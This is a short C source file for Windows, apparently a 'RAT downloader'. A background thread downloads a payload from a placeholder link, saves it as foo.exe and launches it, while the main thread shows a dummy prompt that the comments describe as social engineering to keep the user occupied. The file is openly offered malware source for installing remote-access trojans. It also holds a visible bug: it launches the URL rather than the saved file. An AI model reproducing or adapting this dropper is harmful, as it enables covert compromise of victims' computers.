#include <stdio.h>
#include <windows.h>
#include <urlmon.h>
TCHAR addr[] = TEXT("replace with your payload's link");//link to the payload


void Thread() {
	URLDownloadToFile(NULL, addr, TEXT("foo.exe"), 0, NULL);//download payload
	STARTUPINFO si;
	ZeroMemory(&si, sizeof(STARTUPINFO));
	PROCESS_INFORMATION pi;
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	CreateProcess(addr, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);//run payload
}
int main() {
	CreateThread(NULL, NULL, Thread, NULL, NULL, NULL);//Create our RAT Downloader thread
	while (1) {//Main thread is for phishing the user(social engineering)
		printf("enter a number blabla ");
		getchar();
	}
}